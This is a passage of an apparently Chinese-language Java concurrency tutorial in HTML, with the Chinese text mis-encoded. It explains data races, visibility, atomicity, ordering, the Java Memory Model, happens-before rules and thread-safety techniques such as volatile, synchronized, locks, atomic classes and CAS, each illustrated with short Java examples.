<p><strong>æ•°æ®ç«äº‰</strong>æ˜¯æŒ‡å¤šä¸ªçº¿ç¨‹åœ¨æ²¡æœ‰åŒæ­¥çš„æƒ…å†µä¸‹ï¼ŒåŒæ—¶è®¿é—®åŒä¸€ä¸ªå…±äº«å˜é‡ï¼Œå¹¶ä¸”è‡³å°‘æœ‰ä¸€ä¸ªçº¿ç¨‹åœ¨å†™ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DataRace</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    
    <span class="hljs-comment">// çº¿ç¨‹1</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writer</span><span class="hljs-params">()</span> {
        value = <span class="hljs-number">42</span>;
        flag = <span class="hljs-literal">true</span>; <span class="hljs-comment">// å¯èƒ½è¢«é‡æ’åº</span>
    }
    
    <span class="hljs-comment">// çº¿ç¨‹2</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reader</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (flag) {
            System.out.println(value); <span class="hljs-comment">// å¯èƒ½çœ‹åˆ°value=0</span>
        }
    }
}
</code></pre>
<h4 data-id="heading-36">å¯è§æ€§é—®é¢˜</h4>
<p><strong>å¯è§æ€§</strong>æ˜¯æŒ‡ä¸€ä¸ªçº¿ç¨‹å¯¹å…±äº«å˜é‡çš„ä¿®æ”¹ï¼Œèƒ½å¤ŸåŠæ—¶è¢«å…¶ä»–çº¿ç¨‹çœ‹åˆ°ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VisibilityProblem</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">running</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// æ²¡æœ‰volatileä¿®é¥°</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">while</span> (running) {
                <span class="hljs-comment">// å¯èƒ½æ°¸è¿œå¾ªç¯ï¼Œå› ä¸ºçœ‹ä¸åˆ°runningçš„å˜åŒ–</span>
            }
            System.out.println(<span class="hljs-string">"çº¿ç¨‹ç»“æŸ"</span>);
        }).start();
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">stop</span><span class="hljs-params">()</span> {
        running = <span class="hljs-literal">false</span>; <span class="hljs-comment">// ä¿®æ”¹å¯èƒ½å¯¹å…¶ä»–çº¿ç¨‹ä¸å¯è§</span>
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InterruptedException {
        <span class="hljs-type">VisibilityProblem</span> <span class="hljs-variable">vp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VisibilityProblem</span>();
        vp.start();
        Thread.sleep(<span class="hljs-number">1000</span>);
        vp.stop(); <span class="hljs-comment">// å¯èƒ½æ— æ³•åœæ­¢çº¿ç¨‹</span>
    }
}
</code></pre>
<p><strong>åŸå› ï¼š</strong></p>
<ul>
<li>CPUç¼“å­˜ï¼šæ¯ä¸ªçº¿ç¨‹å¯èƒ½åœ¨è‡ªå·±çš„CPUç¼“å­˜ä¸­ä¿å­˜å˜é‡çš„å‰¯æœ¬</li>
<li>æŒ‡ä»¤é‡æ’åºï¼šç¼–è¯‘å™¨å’ŒCPUå¯èƒ½é‡æ’åºæŒ‡ä»¤</li>
</ul>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">running</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// ä½¿ç”¨volatileä¿è¯å¯è§æ€§</span>
</code></pre>
<h4 data-id="heading-37">åŸå­æ€§é—®é¢˜</h4>
<p><strong>åŸå­æ€§</strong>æ˜¯æŒ‡ä¸€ä¸ªæ“ä½œè¦ä¹ˆå…¨éƒ¨æ‰§è¡Œï¼Œè¦ä¹ˆéƒ½ä¸æ‰§è¡Œï¼Œä¸ä¼šè¢«æ‰“æ–­ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AtomicityProblem</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        count++; <span class="hljs-comment">// ä¸æ˜¯åŸå­æ“ä½œ</span>
    }
    
    <span class="hljs-comment">// åŸå­æ“ä½œç¤ºä¾‹</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">incrementSync</span><span class="hljs-params">()</span> {
        count++; <span class="hljs-comment">// ç°åœ¨æ˜¯åŸå­æ“ä½œ</span>
    }
}
</code></pre>
<p><strong>éåŸå­æ“ä½œç¤ºä¾‹ï¼š</strong></p>
<ul>
<li><code>count++</code> - è¯»å–ã€ä¿®æ”¹ã€å†™å…¥ä¸‰æ­¥</li>
<li><code>count = count + 1</code> - åŒä¸Š</li>
<li><code>obj.field = obj.field + 1</code> - åŒä¸Š</li>
</ul>
<p><strong>åŸå­æ“ä½œï¼š</strong></p>
<ul>
<li>åŸºæœ¬ç±»å‹çš„èµ‹å€¼ï¼ˆlongå’Œdoubleåœ¨32ä½JVMä¸Šé™¤å¤–ï¼‰</li>
<li>volatileå˜é‡çš„è¯»å†™</li>
<li>synchronizedå—å†…çš„æ“ä½œ</li>
</ul>
<h4 data-id="heading-38">æœ‰åºæ€§é—®é¢˜</h4>
<p><strong>æœ‰åºæ€§</strong>æ˜¯æŒ‡ç¨‹åºæ‰§è¡Œçš„é¡ºåºæŒ‰ç…§ä»£ç çš„å…ˆåé¡ºåºæ‰§è¡Œã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderingProblem</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
    
    <span class="hljs-comment">// çº¿ç¨‹1</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writer</span><span class="hljs-params">()</span> {
        a = <span class="hljs-number">1</span>;      <span class="hljs-comment">// 1</span>
        b = <span class="hljs-number">2</span>;      <span class="hljs-comment">// 2</span>
        flag = <span class="hljs-literal">true</span>; <span class="hljs-comment">// 3</span>
    }
    
    <span class="hljs-comment">// çº¿ç¨‹2</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reader</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (flag) {
            <span class="hljs-type">int</span> <span class="hljs-variable">r1</span> <span class="hljs-operator">=</span> a; <span class="hljs-comment">// å¯èƒ½çœ‹åˆ°a=0ï¼Œb=2ï¼ˆé‡æ’åºï¼‰</span>
            <span class="hljs-type">int</span> <span class="hljs-variable">r2</span> <span class="hljs-operator">=</span> b;
        }
    }
}
</code></pre>
<p><strong>æŒ‡ä»¤é‡æ’åºçš„åŸå› ï¼š</strong></p>
<ul>
<li>ç¼–è¯‘å™¨ä¼˜åŒ–</li>
<li>CPUæŒ‡ä»¤çº§å¹¶è¡Œ</li>
<li>å†…å­˜ç³»ç»Ÿé‡æ’åº</li>
</ul>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<ul>
<li>ä½¿ç”¨volatileç¦æ­¢é‡æ’åº</li>
<li>ä½¿ç”¨synchronizedä¿è¯æœ‰åºæ€§</li>
<li>éµå¾ªhappens-beforeè§„åˆ™</li>
</ul>
<h3 data-id="heading-39">2.2 å†…å­˜æ¨¡å‹åŸºç¡€</h3>
<h4 data-id="heading-40">JMMï¼ˆJava Memory Modelï¼‰æ¦‚è¿°</h4>
<p>**Javaå†…å­˜æ¨¡å‹ï¼ˆJMMï¼‰**å®šä¹‰äº†Javaç¨‹åºä¸­å„ç§å˜é‡ï¼ˆå®ä¾‹å˜é‡ã€é™æ€å˜é‡ç­‰ï¼‰çš„è®¿é—®è§„åˆ™ï¼Œä»¥åŠåœ¨JVMä¸­å°†å˜é‡å­˜å‚¨åˆ°å†…å­˜å’Œä»å†…å­˜ä¸­è¯»å–å˜é‡çš„åº•å±‚ç»†èŠ‚ã€‚</p>
<p><strong>JMMçš„ç›®æ ‡ï¼š</strong></p>
<ul>
<li>å±è”½å„ç§ç¡¬ä»¶å’Œæ“ä½œç³»ç»Ÿçš„å†…å­˜è®¿é—®å·®å¼‚</li>
<li>ä¿è¯Javaç¨‹åºåœ¨å„ç§å¹³å°ä¸‹éƒ½èƒ½è¾¾åˆ°ä¸€è‡´çš„å†…å­˜è®¿é—®æ•ˆæœ</li>
<li>ä¸ºå¤šçº¿ç¨‹ç¼–ç¨‹æä¾›å†…å­˜å¯è§æ€§ä¿è¯</li>
</ul>
<h4 data-id="heading-41">ä¸»å†…å­˜ä¸å·¥ä½œå†…å­˜</h4>
<p><strong>ä¸»å†…å­˜ï¼ˆMain Memoryï¼‰ï¼š</strong></p>
<ul>
<li>æ‰€æœ‰å…±äº«å˜é‡éƒ½å­˜å‚¨åœ¨ä¸»å†…å­˜ä¸­</li>
<li>ä¸»å†…å­˜æ˜¯å…±äº«çš„ï¼Œæ‰€æœ‰çº¿ç¨‹éƒ½å¯ä»¥è®¿é—®</li>
</ul>
<p><strong>å·¥ä½œå†…å­˜ï¼ˆWorking Memoryï¼‰ï¼š</strong></p>
<ul>
<li>æ¯ä¸ªçº¿ç¨‹éƒ½æœ‰è‡ªå·±çš„å·¥ä½œå†…å­˜</li>
<li>å·¥ä½œå†…å­˜ä¿å­˜äº†è¯¥çº¿ç¨‹ä½¿ç”¨åˆ°çš„å˜é‡çš„ä¸»å†…å­˜å‰¯æœ¬</li>
<li>çº¿ç¨‹å¯¹å˜é‡çš„æ‰€æœ‰æ“ä½œéƒ½å¿…é¡»åœ¨å·¥ä½œå†…å­˜ä¸­è¿›è¡Œ</li>
<li>ä¸åŒçº¿ç¨‹ä¹‹é—´æ— æ³•ç›´æ¥è®¿é—®å¯¹æ–¹çš„å·¥ä½œå†…å­˜</li>
</ul>
<p><strong>å†…å­˜äº¤äº’æµç¨‹ï¼š</strong></p>
<pre><code class="hljs language-arduino" lang="arduino">ä¸»å†…å­˜
  â†“ read
å·¥ä½œå†…å­˜ï¼ˆçº¿ç¨‹<span class="hljs-number">1</span>ï¼‰ â†â†’ å·¥ä½œå†…å­˜ï¼ˆçº¿ç¨‹<span class="hljs-number">2</span>ï¼‰
  â†“ assign          â†“ assign
  â†“ write           â†“ write
  â†“ store           â†“ store
ä¸»å†…å­˜
</code></pre>
<p><strong>8ç§å†…å­˜æ“ä½œï¼š</strong></p>
<ol>
<li><code>lock</code>ï¼ˆé”å®šï¼‰ï¼šä½œç”¨äºä¸»å†…å­˜ï¼ŒæŠŠå˜é‡æ ‡è¯†ä¸ºçº¿ç¨‹ç‹¬å </li>
<li><code>unlock</code>ï¼ˆè§£é”ï¼‰ï¼šä½œç”¨äºä¸»å†…å­˜ï¼Œé‡Šæ”¾é”å®šçŠ¶æ€çš„å˜é‡</li>
<li><code>read</code>ï¼ˆè¯»å–ï¼‰ï¼šä½œç”¨äºä¸»å†…å­˜ï¼ŒæŠŠå˜é‡å€¼ä»ä¸»å†…å­˜ä¼ è¾“åˆ°çº¿ç¨‹å·¥ä½œå†…å­˜</li>
<li><code>load</code>ï¼ˆè½½å…¥ï¼‰ï¼šä½œç”¨äºå·¥ä½œå†…å­˜ï¼ŒæŠŠreadå¾—åˆ°çš„å€¼æ”¾å…¥å·¥ä½œå†…å­˜çš„å˜é‡å‰¯æœ¬</li>
<li><code>use</code>ï¼ˆä½¿ç”¨ï¼‰ï¼šä½œç”¨äºå·¥ä½œå†…å­˜ï¼ŒæŠŠå·¥ä½œå†…å­˜å˜é‡å€¼ä¼ é€’ç»™æ‰§è¡Œå¼•æ“</li>
<li><code>assign</code>ï¼ˆèµ‹å€¼ï¼‰ï¼šä½œç”¨äºå·¥ä½œå†…å­˜ï¼ŒæŠŠæ‰§è¡Œå¼•æ“æ¥æ”¶çš„å€¼èµ‹ç»™å·¥ä½œå†…å­˜å˜é‡</li>
<li><code>store</code>ï¼ˆå­˜å‚¨ï¼‰ï¼šä½œç”¨äºå·¥ä½œå†…å­˜ï¼ŒæŠŠå·¥ä½œå†…å­˜å˜é‡å€¼ä¼ é€åˆ°ä¸»å†…å­˜</li>
<li><code>write</code>ï¼ˆå†™å…¥ï¼‰ï¼šä½œç”¨äºä¸»å†…å­˜ï¼ŒæŠŠstoreä¼ é€æ¥çš„å€¼æ”¾å…¥ä¸»å†…å­˜å˜é‡</li>
</ol>
<h4 data-id="heading-42">å†…å­˜å¯è§æ€§</h4>
<p><strong>å†…å­˜å¯è§æ€§</strong>æ˜¯æŒ‡å½“ä¸€ä¸ªçº¿ç¨‹ä¿®æ”¹äº†å…±äº«å˜é‡çš„å€¼ï¼Œå…¶ä»–çº¿ç¨‹èƒ½å¤Ÿç«‹å³çœ‹åˆ°è¿™ä¸ªä¿®æ”¹ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MemoryVisibility</span> {
    <span class="hljs-comment">// æ²¡æœ‰volatileï¼Œå¯èƒ½ä¸å¯è§</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writer</span><span class="hljs-params">()</span> {
        count = <span class="hljs-number">1</span>;      <span class="hljs-comment">// æ­¥éª¤1</span>
        flag = <span class="hljs-literal">true</span>;    <span class="hljs-comment">// æ­¥éª¤2</span>
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reader</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (flag) {     <span class="hljs-comment">// æ­¥éª¤3</span>
            <span class="hljs-type">int</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> count; <span class="hljs-comment">// æ­¥éª¤4ï¼Œå¯èƒ½è¯»åˆ°0</span>
        }
    }
}
</code></pre>
<p><strong>å¯è§æ€§é—®é¢˜äº§ç”Ÿçš„åŸå› ï¼š</strong></p>
<ol>
<li><strong>CPUç¼“å­˜</strong>ï¼šæ¯ä¸ªCPUæ ¸å¿ƒæœ‰è‡ªå·±çš„ç¼“å­˜ï¼Œå˜é‡å¯èƒ½åªæ›´æ–°åœ¨ç¼“å­˜ä¸­</li>
<li><strong>æŒ‡ä»¤é‡æ’åº</strong>ï¼šç¼–è¯‘å™¨å’ŒCPUå¯èƒ½é‡æ’åºæŒ‡ä»¤</li>
<li><strong>å¯„å­˜å™¨ä¼˜åŒ–</strong>ï¼šå˜é‡å¯èƒ½è¢«ä¼˜åŒ–åˆ°å¯„å­˜å™¨ä¸­</li>
</ol>
<p><strong>ä¿è¯å¯è§æ€§çš„æ–¹æ³•ï¼š</strong></p>
<ul>
<li><code>volatile</code>å…³é”®å­—</li>
<li><code>synchronized</code>å…³é”®å­—</li>
<li><code>final</code>å…³é”®å­—ï¼ˆåˆå§‹åŒ–åå¯è§ï¼‰</li>
<li><code>Lock</code>æ¥å£</li>
</ul>
<h4 data-id="heading-43">happens-beforeè§„åˆ™</h4>
<p><strong>happens-before</strong>æ˜¯JMMçš„æ ¸å¿ƒæ¦‚å¿µï¼Œç”¨äºæè¿°ä¸¤ä¸ªæ“ä½œä¹‹é—´çš„å¯è§æ€§å…³ç³»ã€‚</p>
<p><strong>è§„åˆ™1ï¼šç¨‹åºé¡ºåºè§„åˆ™</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;  <span class="hljs-comment">// æ“ä½œ1</span>
<span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span>;  <span class="hljs-comment">// æ“ä½œ2</span>
<span class="hljs-comment">// æ“ä½œ1 happens-before æ“ä½œ2</span>
</code></pre>
<p><strong>è§„åˆ™2ï¼švolatileè§„åˆ™</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;

<span class="hljs-comment">// çº¿ç¨‹1</span>
x = <span class="hljs-number">1</span>; <span class="hljs-comment">// å†™æ“ä½œ</span>

<span class="hljs-comment">// çº¿ç¨‹2</span>
<span class="hljs-type">int</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> x; <span class="hljs-comment">// è¯»æ“ä½œï¼Œèƒ½çœ‹åˆ°x=1</span>
</code></pre>
<p><strong>è§„åˆ™3ï¼šä¼ é€’æ€§è§„åˆ™</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å¦‚æœ A happens-before Bï¼ŒB happens-before C</span>
<span class="hljs-comment">// é‚£ä¹ˆ A happens-before C</span>
</code></pre>
<p><strong>è§„åˆ™4ï¼šç›‘è§†å™¨é”è§„åˆ™</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">synchronized</span> (lock) {
    <span class="hljs-comment">// è§£é” happens-before åç»­çš„åŠ é”</span>
}
</code></pre>
<p><strong>è§„åˆ™5ï¼šstart()è§„åˆ™</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Thread</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-comment">// çº¿ç¨‹tä¸­çš„æ“ä½œ</span>
});
t.start(); <span class="hljs-comment">// start() happens-before çº¿ç¨‹tä¸­çš„ä»»ä½•æ“ä½œ</span>
</code></pre>
<p><strong>è§„åˆ™6ï¼šjoin()è§„åˆ™</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Thread</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-comment">// çº¿ç¨‹tä¸­çš„æ“ä½œ</span>
});
t.start();
t.join(); <span class="hljs-comment">// çº¿ç¨‹tä¸­çš„æ‰€æœ‰æ“ä½œ happens-before join()è¿”å›</span>
</code></pre>
<p><strong>è§„åˆ™7ï¼šçº¿ç¨‹ä¸­æ–­è§„åˆ™</strong></p>
<pre><code class="hljs language-java" lang="java">thread.interrupt(); <span class="hljs-comment">// happens-before æ£€æµ‹åˆ°ä¸­æ–­</span>
</code></pre>
<p><strong>è§„åˆ™8ï¼šå¯¹è±¡ç»ˆç»“è§„åˆ™</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å¯¹è±¡çš„æ„é€ å‡½æ•° happens-before finalize()æ–¹æ³•</span>
</code></pre>
<h4 data-id="heading-44">as-if-serialè¯­ä¹‰</h4>
<p><strong>as-if-serialè¯­ä¹‰</strong>æ˜¯æŒ‡ï¼šä¸ç®¡æ€ä¹ˆé‡æ’åºï¼Œå•çº¿ç¨‹ç¨‹åºçš„æ‰§è¡Œç»“æœä¸èƒ½è¢«æ”¹å˜ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;      <span class="hljs-comment">// 1</span>
<span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span>;      <span class="hljs-comment">// 2</span>
<span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> a + b;  <span class="hljs-comment">// 3ï¼Œä¾èµ–aå’Œb</span>

<span class="hljs-comment">// å¯ä»¥é‡æ’åº1å’Œ2ï¼Œä½†ä¸èƒ½é‡æ’åº3åˆ°1æˆ–2ä¹‹å‰</span>
</code></pre>
<p><strong>å•çº¿ç¨‹ vs å¤šçº¿ç¨‹ï¼š</strong></p>
<ul>
<li><strong>å•çº¿ç¨‹</strong>ï¼šas-if-serialä¿è¯ç»“æœæ­£ç¡®</li>
<li><strong>å¤šçº¿ç¨‹</strong>ï¼šéœ€è¦happens-beforeä¿è¯å¯è§æ€§</li>
</ul>
<h3 data-id="heading-45">2.3 çº¿ç¨‹å®‰å…¨çš„å®ç°æ–¹å¼</h3>
<h4 data-id="heading-46">ä¸å¯å˜å¯¹è±¡</h4>
<p>**ä¸å¯å˜å¯¹è±¡ï¼ˆImmutable Objectï¼‰**æ˜¯æŒ‡å¯¹è±¡åˆ›å»ºåçŠ¶æ€ä¸èƒ½è¢«ä¿®æ”¹ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¯å˜ç±»ç¤ºä¾‹</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ImmutablePoint</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> x;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> y;
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ImmutablePoint</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span> {
        <span class="hljs-built_in">this</span>.x = x;
        <span class="hljs-built_in">this</span>.y = y;
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getX</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> x;
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getY</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> y;
    }
    
    <span class="hljs-comment">// æ²¡æœ‰setteræ–¹æ³•ï¼ŒçŠ¶æ€ä¸å¯å˜</span>
}
</code></pre>
<p><strong>å®ç°ä¸å¯å˜å¯¹è±¡çš„åŸåˆ™ï¼š</strong></p>
<ol>
<li>æ‰€æœ‰å­—æ®µéƒ½æ˜¯<code>final</code>çš„</li>
<li>ç±»å£°æ˜ä¸º<code>final</code>ï¼Œé˜²æ­¢è¢«ç»§æ‰¿</li>
<li>ä¸æä¾›ä¿®æ”¹çŠ¶æ€çš„æ–¹æ³•</li>
<li>å¦‚æœå­—æ®µæ˜¯å¼•ç”¨ç±»å‹ï¼Œç¡®ä¿å¼•ç”¨çš„å¯¹è±¡ä¹Ÿæ˜¯ä¸å¯å˜çš„</li>
</ol>
<p><strong>Javaä¸­çš„ä¸å¯å˜ç±»ï¼š</strong></p>
<ul>
<li><code>String</code></li>
<li><code>Integer</code>ã€<code>Long</code>ç­‰åŒ…è£…ç±»</li>
<li><code>BigInteger</code>ã€<code>BigDecimal</code></li>
</ul>
<h4 data-id="heading-47">çº¿ç¨‹å°é—­</h4>
<p>**çº¿ç¨‹å°é—­ï¼ˆThread Confinementï¼‰**æ˜¯æŒ‡å°†å¯¹è±¡é™åˆ¶åœ¨å•ä¸ªçº¿ç¨‹ä¸­ï¼Œé¿å…å…±äº«ã€‚</p>
<p><strong>æ–¹å¼1ï¼šæ ˆå°é—­</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">localVar</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// å±€éƒ¨å˜é‡ï¼Œçº¿ç¨‹å®‰å…¨</span>
    localVar++;
}
</code></pre>
<p><strong>æ–¹å¼2ï¼šThreadLocal</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadLocalExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> ThreadLocal&lt;Integer&gt; threadLocal = 
        ThreadLocal.withInitial(() -&gt; <span class="hljs-number">0</span>);
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        threadLocal.set(threadLocal.get() + <span class="hljs-number">1</span>);
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">get</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> threadLocal.get();
    }
}
</code></pre>
<h4 data-id="heading-48">åŒæ­¥æœºåˆ¶</h4>
<p><strong>æ–¹å¼1ï¼šsynchronized</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SynchronizedExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        count++;
    }
}
</code></pre>
<p><strong>æ–¹å¼2ï¼šLock</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.concurrent.locks.ReentrantLock;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LockExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        lock.lock();
        <span class="hljs-keyword">try</span> {
            count++;
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    }
}
</code></pre>
<p><strong>æ–¹å¼3ï¼šåŸå­ç±»</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.concurrent.atomic.AtomicInteger;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AtomicExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        count.incrementAndGet();
    }
}
</code></pre>
<h4 data-id="heading-49">æ— é”ç¼–ç¨‹</h4>
<p>**æ— é”ç¼–ç¨‹ï¼ˆLock-Free Programmingï¼‰**ä½¿ç”¨CASæ“ä½œå®ç°çº¿ç¨‹å®‰å…¨ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.concurrent.atomic.AtomicInteger;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LockFreeExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        <span class="hljs-type">int</span> current;
        <span class="hljs-type">int</span> next;
        <span class="hljs-keyword">do</span> {
            current = count.get();
            next = current + <span class="hljs-number">1</span>;
        } <span class="hljs-keyword">while</span> (!count.compareAndSet(current, next));
    }
}
</code></pre>
<p><strong>æ— é”ç¼–ç¨‹çš„ä¼˜åŠ¿ï¼š</strong></p>
